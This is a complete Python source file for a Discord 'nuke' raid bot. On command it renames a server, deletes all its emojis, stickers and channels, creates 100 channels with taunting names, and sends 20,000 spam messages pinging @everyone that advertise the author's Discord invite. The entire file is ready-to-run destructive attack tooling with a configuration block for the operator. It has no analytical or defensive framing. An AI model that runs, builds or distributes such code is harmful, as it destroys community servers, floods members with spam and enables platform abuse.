# dnezRaider - Custom nuke bot

import asyncio
import discord
from discord.ext import commands
import random
import time

# --- CONFIGURE THESE ---
BOT_TOKEN = "PUT YOUR BOT TOKEN HERE!"
PREFIX = "."

# Nuke Configuration
CHANNEL_NAME = "nuked"  # fallback (not used if random names are on)
MESSAGE = """# NUKED BY N3XL 
N3XEL ON TOP join da server NOW FOR FREE NUKE BOT 2026!
https://discord.gg/pbtxaTf8Q4
https://media1.giphy.com/media/v1.Y2lkPTc5MGI3NjExNHRleGlwcWllOWl6MnNvYWU3N3V4NXJveXcya2oyeXEwZDZmaW9heSZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/Eg41D2Obf58kpy8aaK/giphy.gif
||@everyone|| ||@here||"""
AMOUNT_OF_CHANNELS = 100
AMOUNT_OF_MESSAGES = 20000  # ← CHANGED from 1000 to 20000

# Random channel name variations
RANDOM_CHANNEL_NAMES = [
    "𝔫𝔦𝔤𝔥𝔱𝔪𝔞𝔯𝔢 𝔦𝔰 𝔥𝔢𝔯𝔢",
    "ɴɪɢʜᴛᴍᴀʀᴇ ɪs ʜᴇʀᴇ",
    "ⁿⁱᵍʰᵐᵃʳᵉ ⁱˢ ʰᵉʳᵉ",
    "₦ł₲Ⱨ₮₥₳ⱤɆ ł₴ ⱧɆⱤɆ",
    "d̸e̸st̸r̸o̸y̸e̸d̸",
    "n҈i҈g҈h҈m҈a҈r҈e҈ i҈s҈ h҈e҈r҈e҈",
    "d҉e҉s҉t҉r҉o҉y҉e҉d҉d",
    "dєstrσчєd",
    "n̶i̶g̶h̶t̶m̶a̶r̶e̶"
]

USE_RANDOM_NAMES = True  # Set to False to use CHANNEL_NAME only

# -----------------------
# DO NOT MODIFY BEYOND THIS POINT UNLESS YOU KNOW WHAT YOU'RE DOING!
# -----------------------

def get_channel_name():
    """Get channel name (random or fixed)"""
    if USE_RANDOM_NAMES and RANDOM_CHANNEL_NAMES:
        return random.choice(RANDOM_CHANNEL_NAMES)
    return CHANNEL_NAME

intents = discord.Intents.default()
intents.guilds = True
intents.members = True
intents.message_content = True
intents.emojis = True          # to see emojis
intents.guild_stickers = True  # to see stickers

bot = commands.Bot(command_prefix=PREFIX, intents=intents)

async def send_messages_fast(channels, message, total):
    """Send messages with rate limiting using semaphore"""
    if not channels:
        return
    
    semaphore = asyncio.Semaphore(50)
    
    async def send_with_limit(channel, msg):
        async with semaphore:
            try:
                await channel.send(msg)
            except Exception:
                pass
    
    tasks = []
    for i in range(total):
        channel = channels[i % len(channels)]
        tasks.append(send_with_limit(channel, message))
    
    await asyncio.gather(*tasks, return_exceptions=True)

async def nuke_server(guild: discord.Guild):
    """Main nuke logic - rename server, delete emojis/stickers, delete channels, create new ones, spam"""
    print(f"Starting nuke on {guild.name} ({guild.id})")
    start_time = time.perf_counter()

    # Step 1: Rename server
    try:
        await guild.edit(name="<<[ TAMED BY N3XEL]>>")
        print("Server renamed.")
    except Exception as e:
        print(f"Failed to rename server: {e}")

    # Step 2: Delete all emojis
    print("Deleting all emojis...")
    emoji_tasks = []
    for emoji in guild.emojis:
        try:
            emoji_tasks.append(emoji.delete())
        except Exception:
            pass
    if emoji_tasks:
        await asyncio.gather(*emoji_tasks, return_exceptions=True)
        print("Emojis deleted.")
    else:
        print("No emojis to delete.")

    # Step 3: Delete all stickers
    print("Deleting all stickers...")
    sticker_tasks = []
    for sticker in guild.stickers:
        try:
            sticker_tasks.append(sticker.delete())
        except Exception:
            pass
    if sticker_tasks:
        await asyncio.gather(*sticker_tasks, return_exceptions=True)
        print("Stickers deleted.")
    else:
        print("No stickers to delete.")

    # Step 4: Delete all channels
    print("Deleting all channels...")
    await asyncio.gather(
        *(channel.delete() for channel in guild.channels),
        return_exceptions=True
    )

    # Step 5: Create new channels
    print(f"Creating {AMOUNT_OF_CHANNELS} channels...")
    async def create_raid_channel():
        return await guild.create_text_channel(get_channel_name())
    
    channels = await asyncio.gather(
        *(create_raid_channel() for _ in range(AMOUNT_OF_CHANNELS)),
        return_exceptions=True
    )

    # Step 6: Send messages
    text_channels = [c for c in channels if isinstance(c, discord.TextChannel)]
    if text_channels:
        print(f"Sending {AMOUNT_OF_MESSAGES} messages...")
        await send_messages_fast(text_channels, MESSAGE, AMOUNT_OF_MESSAGES)

    elapsed = time.perf_counter() - start_time
    print(f"Nuke completed in {elapsed:.2f} seconds!")

@bot.event
async def on_ready():
    print(f"Bot is online as {bot.user}")
    print(f"Prefix: {PREFIX}")
    print(f"Command: {PREFIX}nuke")
    print("=" * 50)

@bot.command(name="nuke")
async def nuke(ctx):
    """Nuke the current server"""
    # Check if user has administrator permission
    if not ctx.author.guild_permissions.administrator:
        await ctx.send("❌ You need Administrator permission to use this command!")
        return

    # Confirm the nuke
    await ctx.send("💣 Nuking server in progress...")
    
    # Execute the nuke
    await nuke_server(ctx.guild)

@bot.command(name="config")
async def config(ctx):
    """Show current configuration"""
    config_msg = f"""
**Current Configuration:**
📝 Channel Name: `{CHANNEL_NAME}`
🎲 Random Names: `{'Enabled' if USE_RANDOM_NAMES else 'Disabled'}`
💬 Message: `{MESSAGE[:50]}...`
📊 Channels: `{AMOUNT_OF_CHANNELS}`
📨 Messages: `{AMOUNT_OF_MESSAGES}`
    """
    await ctx.send(config_msg)

if __name__ == "__main__":
    print("Starting Nuke Bot...")
    print("=" * 50)
    bot.run(BOT_TOKEN)
